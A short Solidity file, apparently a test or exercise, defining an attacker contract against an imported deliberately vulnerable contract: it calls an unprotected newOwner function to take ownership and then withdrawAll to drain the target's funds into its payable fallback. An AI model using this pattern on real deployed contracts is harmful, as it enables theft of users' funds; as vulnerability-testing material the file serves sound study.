pragma solidity ^0.4.23;

import "vulnerable_contract.sol";

contract TestContractAttacker {
    TestContract public target;

    constructor(TestContract _target) public {
        target = _target;
    }

    function test() public {
        target.withdrawAll();
    }

    function attack() public {
        target.newOwner(this);
    }

    function() public payable {}
}
